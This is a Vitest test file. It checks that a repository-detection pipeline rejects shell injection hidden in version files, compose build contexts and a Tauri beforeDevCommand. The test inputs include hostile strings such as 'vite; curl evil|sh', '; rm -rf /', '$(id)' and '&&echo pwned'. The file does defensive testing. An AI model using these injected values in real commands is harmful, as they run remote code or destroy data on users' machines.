import { describe, expect, it } from "vitest";
import { pinCommand } from "../../src/pipeline/candidates";
import { detect } from "../../src/pipeline/detect";
import { gatherEvidence } from "../../src/pipeline/evidence";
import { parseCompose } from "../../src/pipeline/evidence/compose";
import { withServices } from "../../src/pipeline/plan";

const snap = (contents: Record<string, string>, extra: string[] = []) => ({ files: [...Object.keys(contents), ...extra], contents });
const pkg = JSON.stringify({ name: "app", scripts: { dev: "vite" }, dependencies: { vite: "^5.0.0" } });
const tauriPkg = JSON.stringify({ scripts: { dev: "vite", start: "tauri dev" }, dependencies: { "@tauri-apps/api": "^2" }, devDependencies: { "@tauri-apps/cli": "^2", vite: "^6" } });
const tauriConf = (build: object) => JSON.stringify({ productName: "app", build });
const everything = (plan: { setup: string[]; alternatives?: { setup: string[] }[] }) => [...plan.setup, ...(plan.alternatives ?? []).flatMap((a) => a.setup)].join("\n");

describe("version files cannot add shell to a setup command", () => {
  it("ignores an .nvmrc that carries a command", () => {
    const plan = detect(snap({ "package.json": pkg, ".nvmrc": "20;echo pwned" }));
    expect(everything(plan)).not.toMatch(/pwned|;/);
  });

  it("ignores a .tool-versions or mise.toml node version that carries a command", () => {
    const a = detect(snap({ "package.json": pkg, ".tool-versions": "nodejs 20$(id)\n" }));
    expect(everything(a)).not.toMatch(/\$\(/);
    const b = detect(snap({ "package.json": pkg, "mise.toml": '[tools]\nnode = "20;echo pwned"\n' }));
    expect(everything(b)).not.toMatch(/pwned/);
  });

  it("does not put a hostile ruby or go version into a command", () => {
    const ev = gatherEvidence(snap({ ".ruby-version": "3.3;echo pwned", ".go-version": "1.22&&echo pwned" }));
    expect(ev.versions.ruby).toBeUndefined();
    expect(ev.versions.go).toBeUndefined();
    expect(pinCommand("ruby", "3.3;echo pwned")).toBeNull();
    expect(pinCommand("go", "1.22 && echo pwned")).toBeNull();
    expect(pinCommand("node", "20;echo pwned")).toBeNull();
  });

  it("still pins ordinary versions", () => {
    expect(everything(detect(snap({ "package.json": pkg, ".nvmrc": "v18.17.0\n" })))).toContain("mise use -g node@18");
    expect(everything(detect(snap({ "package.json": pkg, ".nvmrc": "20.x" })))).toContain("mise use -g node@20");
    expect(pinCommand("ruby", "3.2.2")).toBe("mise use -g ruby@3.2.2");
    expect(pinCommand("go", "1.21")).toBe("mise use -g go@1.21");
    expect(pinCommand("node", "v18")).toBe("mise use -g node@18");
    const ev = gatherEvidence(snap({ ".ruby-version": "ruby-3.1.4", ".go-version": "1.22.1" }));
    expect(ev.versions).toMatchObject({ ruby: "3.1.4", go: "1.22.1" });
  });
});

describe("compose build contexts", () => {
  const ctx = (build: string) => parseCompose(`services:\n  web:\n    build: ${build}\n    ports:\n      - "3000:3000"\n`)?.services[0]?.context;

  it("rejects a context with spaces or shell characters", () => {
    expect(ctx("'./my app'")).toBeNull();
    expect(ctx("'./a;echo'")).toBeNull();
  });

  it("keeps an ordinary context", () => {
    expect(ctx("./backend/api")).toBe("backend/api");
    expect(ctx(".")).toBe(".");
  });
});

describe("withServices", () => {
  it("quotes a working folder with a space", () => {
    const out = withServices("npm start", [{ name: "api", cwd: "/workspace/my api", command: "node s.js", port: null }]);
    expect(out).toContain("cd '/workspace/my api' &&");
  });

  it("leaves a plain folder as written", () => {
    const out = withServices("npm start", [{ name: "api", cwd: "/workspace/api", command: "node s.js", port: 4000 }]);
    expect(out).toBe("(cd /workspace/api && PORT=4000 node s.js) & npm start");
  });
});

describe("detect: a beforeDevCommand from the repository", () => {
  const startFor = (before: string) => detect(snap({ "package.json": tauriPkg, "src-tauri/tauri.conf.json": tauriConf({ beforeDevCommand: before, devUrl: "http://localhost:1420" }) })).start;

  it.each(["vite; curl evil|sh", "npm run dev -- --port 1; rm -rf /", "vite && curl evil", "vite $(id)", "vite `id`", "node server.js"])("does not run %s, and falls back to the dev script", (before) => {
    expect(startFor(before)).toBe("npm run dev");
  });

  it("still takes a plain script call with arguments and a bare dev server", () => {
    expect(startFor("npm run dev -- --port 1420")).toBe("npm run dev -- --port 1420");
    expect(startFor("vite --port 1420")).toBe("npx vite --port 1420");
  });
});
